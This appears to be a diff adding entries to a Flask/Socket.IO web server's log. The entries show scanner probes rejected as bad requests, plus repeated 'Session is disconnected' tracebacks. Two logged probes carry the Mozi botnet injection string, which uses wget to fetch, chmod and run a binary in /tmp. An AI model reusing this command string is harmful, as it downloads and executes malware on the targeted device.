@@ -649,3 +649,122 @@ KeyError: 'Session is disconnected'
 159.223.67.34 - - [25/Nov/2024 00:02:50] code 400, message Bad request version ('À\x13À')
 103.199.191.143 - - [25/Nov/2024 00:34:42] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
 93.174.93.12 - - [25/Nov/2024 01:41:30] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+80.82.77.202 - - [25/Nov/2024 01:57:19] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+152.32.200.22 - - [25/Nov/2024 02:39:11] code 400, message Bad request version ('\x00\x9eÌ¨Ìª\x003\x00=\x00\x16À')
+172.104.11.51 - - [25/Nov/2024 03:51:15] code 400, message Bad request version ('À\x13À')
+185.91.127.43 - - [25/Nov/2024 06:01:42] code 400, message Bad request syntax ('\x05\x01\x00')
+104.152.52.37 - - [25/Nov/2024 06:02:27] code 400, message Bad request version ('RTSP/1.0')
+104.152.52.37 - - [25/Nov/2024 06:02:33] code 400, message Bad HTTP/0.9 request type ('l\x00')
+104.152.52.37 - - [25/Nov/2024 06:02:39] code 400, message Bad request version ('\x00\x01\x97|\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
+104.152.52.37 - - [25/Nov/2024 06:02:44] code 400, message Bad HTTP/0.9 request type ('\x00')
+104.152.52.37 - - [25/Nov/2024 06:02:50] code 400, message Bad HTTP/0.9 request type ('\x00')
+104.152.52.37 - - [25/Nov/2024 06:02:50] code 400, message Bad request syntax ('HELP')
+104.152.52.37 - - [25/Nov/2024 06:02:50] code 400, message Bad request syntax ('\x16\x03\x00\x00S\x01\x00\x00O\x03\x00?G×÷º,îê²`~ó\x00ý\x82{¹Õ\x96Èw\x9bæÄÛ<=Ûoï\x10n\x00\x00(\x00\x16\x00\x13\x00')
+104.152.52.37 - - [25/Nov/2024 06:02:51] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00*%à\x00\x00\x00\x00\x00Cookie:')
+104.152.52.37 - - [25/Nov/2024 06:02:51] code 400, message Bad request version ('\x00/\x00')
+104.152.52.37 - - [25/Nov/2024 06:02:52] code 400, message Bad request syntax ('\x00\x00\x00qj\x81n0\x81k¡\x03\x02\x01\x05¢\x03\x02\x01')
+104.152.52.37 - - [25/Nov/2024 06:02:57] code 400, message Bad request version ('0.12\x00')
+104.152.52.37 - - [25/Nov/2024 06:02:57] code 400, message Bad request syntax ('\x01default')
+104.152.52.37 - - [25/Nov/2024 06:02:58] code 400, message Bad request syntax ('0\x84\x00\x00\x00-\x02\x01\x07c\x84\x00\x00\x00$\x04\x00')
+104.152.52.37 - - [25/Nov/2024 06:03:03] code 400, message Bad HTTP/0.9 request type ('0')
+172.104.11.51 - - [25/Nov/2024 06:42:48] code 400, message Bad request version ('Ù\x97')
+103.42.243.3 - - [25/Nov/2024 07:03:53] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+5.8.11.202 - - [25/Nov/2024 07:58:25] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+152.42.214.50 - - [25/Nov/2024 08:02:37] code 400, message Bad request version ('\x9as?ß\x06fØ}')
+159.223.69.51 - - [25/Nov/2024 08:02:48] code 400, message Bad request version ('À\x13À')
+147.185.132.171 - - [25/Nov/2024 11:57:20] code 400, message Bad request syntax ('\x16\x03\x01\x00î\x01\x00\x00ê\x03\x03N\x08C:¬ÆXj\x10\x9fà\x81\x8dÈOÅzz@,\x8e\x8cÄó·')
+147.185.132.171 - - [25/Nov/2024 11:57:20] code 400, message Bad request version ('À(À$À\x14À')
+205.210.31.147 - - [25/Nov/2024 12:15:18] code 400, message Bad request version ('À\x13À')
+205.210.31.147 - - [25/Nov/2024 12:15:19] code 400, message Bad HTTP/0.9 request type ("\x16\x03\x01\x00Ê\x01\x00\x00Æ\x03\x03\x18\x95Üt\x06\x88=iê\x95\x15*õ2\x05T\\\x8b»õ\x83å=\x06k\x9e7,\x08/ù\x08\x00\x00hÌ\x14Ì\x13À/À+À0À,À\x11À\x07À'À#À\x13À")
+5.8.11.202 - - [25/Nov/2024 12:24:16] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+80.66.76.121 - - [25/Nov/2024 14:05:46] code 400, message Bad HTTP/0.9 request type ('\x03\x00\x00/*à\x00\x00\x00\x00\x00Cookie:')
+80.82.77.202 - - [25/Nov/2024 14:15:49] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+152.42.247.210 - - [25/Nov/2024 16:03:01] code 400, message Bad request version ('À\x13À')
+3.8.39.86 - - [25/Nov/2024 17:28:04] code 400, message Bad request version ('À\x14À')
+3.8.39.86 - - [25/Nov/2024 17:30:10] code 400, message Bad request version ('À\x14À')
+3.8.39.86 - - [25/Nov/2024 17:33:25] code 400, message Bad request syntax ('\x16\x03\x01\x00±\x01\x00\x00\xad\x03\x03k\x90³ô¿¦³')
+3.8.39.86 - - [25/Nov/2024 17:38:21] code 400, message Bad request version ('À\x14À')
+3.8.39.86 - - [25/Nov/2024 17:43:18] code 400, message Bad request version ('À\x14À')
+3.8.39.86 - - [25/Nov/2024 17:48:53] code 400, message Bad request version ('À\x14À')
+3.8.39.86 - - [25/Nov/2024 17:53:45] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x00±\x01\x00\x00\xad\x03\x03Jå-Ê\x8aè\x13c9¹\x04\x82Dª¼\x87mó.¼RC7\x9aîýã%Sí]?\x00\x00PÀ/À+À\x11À\x07À\x13À')
+34.148.118.48 - - [25/Nov/2024 17:55:18] code 400, message Bad request version ('\x91#¦¹PõÙºíØ\x98Õ\x0f.\x19×\x89')
+3.8.39.86 - - [25/Nov/2024 17:58:26] code 400, message Bad request version ('À\x14À')
+3.8.39.86 - - [25/Nov/2024 18:03:31] code 400, message Bad request version ('À\x14À')
+3.8.39.86 - - [25/Nov/2024 18:08:38] code 400, message Bad request version ('À\x14À')
+3.8.39.86 - - [25/Nov/2024 18:13:56] code 400, message Bad request version ('À\x14À')
+64.62.197.237 - - [25/Nov/2024 18:33:51] code 400, message Bad request version ('À\x14À')
+93.174.93.12 - - [25/Nov/2024 21:07:59] code 400, message Bad request version ("¯nãY»bhlÿ(=':©\x82ÙoÈ¢×\x93\x98´ï\x80å¹\x90\x00(À")
+162.142.125.208 - - [25/Nov/2024 23:34:57] code 505, message Invalid HTTP version (2.0)
+159.223.69.51 - - [26/Nov/2024 00:02:51] code 400, message Bad HTTP/0.9 request type ('\x16\x03\x01\x01')
+159.223.67.34 - - [26/Nov/2024 00:02:55] code 400, message Bad request version ('À\x13À')
+192.155.90.118 - - [26/Nov/2024 00:13:04] code 400, message Bad request version ('\x9b7V4YË>ÛL\x11ûç')
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+  File "/usr/local/lib/python3.10/dist-packages/engineio/middleware.py", line 63, in __call__
+    return self.engineio_app.handle_request(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/socketio/server.py", line 433, in handle_request
+    return self.eio.handle_request(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/engineio/server.py", line 292, in handle_request
+    socket = self._get_socket(sid)
+  File "/usr/local/lib/python3.10/dist-packages/engineio/base_server.py", line 229, in _get_socket
+    raise KeyError('Session is disconnected')
+KeyError: 'Session is disconnected'
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+  File "/usr/local/lib/python3.10/dist-packages/engineio/middleware.py", line 63, in __call__
+    return self.engineio_app.handle_request(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/socketio/server.py", line 433, in handle_request
+    return self.eio.handle_request(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/engineio/server.py", line 272, in handle_request
+    socket = self._get_socket(sid)
+  File "/usr/local/lib/python3.10/dist-packages/engineio/base_server.py", line 229, in _get_socket
+    raise KeyError('Session is disconnected')
+KeyError: 'Session is disconnected'
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+  File "/usr/local/lib/python3.10/dist-packages/engineio/middleware.py", line 63, in __call__
+    return self.engineio_app.handle_request(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/socketio/server.py", line 433, in handle_request
+    return self.eio.handle_request(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/engineio/server.py", line 272, in handle_request
+    socket = self._get_socket(sid)
+  File "/usr/local/lib/python3.10/dist-packages/engineio/base_server.py", line 229, in _get_socket
+    raise KeyError('Session is disconnected')
+KeyError: 'Session is disconnected'
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+  File "/usr/local/lib/python3.10/dist-packages/engineio/middleware.py", line 63, in __call__
+    return self.engineio_app.handle_request(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/socketio/server.py", line 433, in handle_request
+    return self.eio.handle_request(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/engineio/server.py", line 272, in handle_request
+    socket = self._get_socket(sid)
+  File "/usr/local/lib/python3.10/dist-packages/engineio/base_server.py", line 229, in _get_socket
+    raise KeyError('Session is disconnected')
+KeyError: 'Session is disconnected'
+Traceback (most recent call last):
+  File "/usr/local/lib/python3.10/dist-packages/flask/app.py", line 1498, in __call__
+    return self.wsgi_app(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/flask_socketio/__init__.py", line 43, in __call__
+    return super(_SocketIOMiddleware, self).__call__(environ,
+  File "/usr/local/lib/python3.10/dist-packages/engineio/middleware.py", line 63, in __call__
+    return self.engineio_app.handle_request(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/socketio/server.py", line 433, in handle_request
+    return self.eio.handle_request(environ, start_response)
+  File "/usr/local/lib/python3.10/dist-packages/engineio/server.py", line 272, in handle_request
+    socket = self._get_socket(sid)
+  File "/usr/local/lib/python3.10/dist-packages/engineio/base_server.py", line 229, in _get_socket
+    raise KeyError('Session is disconnected')
+KeyError: 'Session is disconnected'
